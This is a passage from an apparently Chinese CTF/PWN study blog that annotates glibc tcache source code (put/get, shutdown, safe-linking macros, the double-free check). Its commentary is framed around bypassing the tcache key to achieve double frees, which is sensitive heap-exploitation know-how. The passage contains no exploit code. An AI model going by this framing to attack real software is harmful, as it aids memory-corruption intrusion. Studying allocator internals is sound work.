title="TcacheBin释放"></a>TcacheBin释放</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>; <span class="comment">//将TcacheBin堆头置空</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i]; <span class="comment">//释放每一个bin</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="comment">//检查chunk对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp); <span class="comment">//释放临时堆头</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TcacheBin存取chunk"><a href="#TcacheBin存取chunk" class="headerlink" title="TcacheBin存取chunk"></a>TcacheBin存取chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> <span class="comment">//空闲chunk存入tcachebin</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key; <span class="comment">//防止double free的key</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="comment">//将当前bin头部chunk的指针加密后赋给next</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e; <span class="comment">//将这个chunk存进相应索引的bin链表头部（更新bin头部）</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//chunk计数器+1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span> <span class="comment">//从tcachebin取出chunk</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx]; <span class="comment">//根据计算好的索引取出链表头部的chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="comment">//检查chunk对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next); <span class="comment">//将头部地址改成下一个chunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">//计数器-1</span></span><br><span class="line">  e-&gt;key = <span class="number">0</span>; <span class="comment">//key位置置空</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当chunk进入tcachebin时，它会被赋予这个TcacheBin的key，意味着这个chunk<strong>已经加入tcachebin了</strong>，当我们想要进行double free时，free会检查这个key是否存在，存在则说明double free了，所以要想办法绕过key的检查。而在2.28版本之前想进行double free是相当方便的，可以直接连续free。</p><p>这里还有一个问题：可以注意到在维护next成员的时候用了一个叫做<code>PROTECT_PTR</code>的函数，在维护entries的时候有一个<code>REVEAL_PTR</code>函数。我们对它们进行溯源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>发现tcache对fd进行了一定的位运算后才存到chunk上，来当做一个简单的加密。这是从2.32版本才开始引入的机制（但是感觉有点掩耳盗铃的意思）。简单来说就是把当前存fd的地址右移12之后再和fd异或，就得到了一个加密的fd。</p><h3 id="执行free的时候TcacheBin对chunk的检查机制"><a href="#执行free的时候TcacheBin对chunk的检查机制" class="headerlink" title="执行free的时候TcacheBin对chunk的检查机制"></a>执行free的时候TcacheBin对chunk的检查机制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp))) <span class="comment">//对chunk对齐的检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e) <span class="comment">//对double free的检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">//bin没满</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>不难发现，tcache虽然检查较少，但是相对于低版本，高版本会对double free和chunk对齐进行检查。</p><h3 id="Stashing机制"><a href="#Stashing机制" class="headerlink" title="Stashing机制"></a>Stashing机制</h3><p>见另一篇文章</p><p>参考阅读：<br>- <a href="https://blog.csdn.net/Tokameine/article/details/119458425">关于如何理解Glibc堆管理器(Ⅶ——Tcache Bins!!)</a><br>- <a href="https://www.freebuf.com/articles/system/291760.html">TcacheBin的相关知识以及漏洞利用</a><br>- <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source">glibc源码在线阅读</a><br>- <a href="https://ftp.gnu.org/pub/gnu/glibc/">glibc源码下载</a></p>]]></content>
      
      
      <categories>
          
          <category> glibc源码补完计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
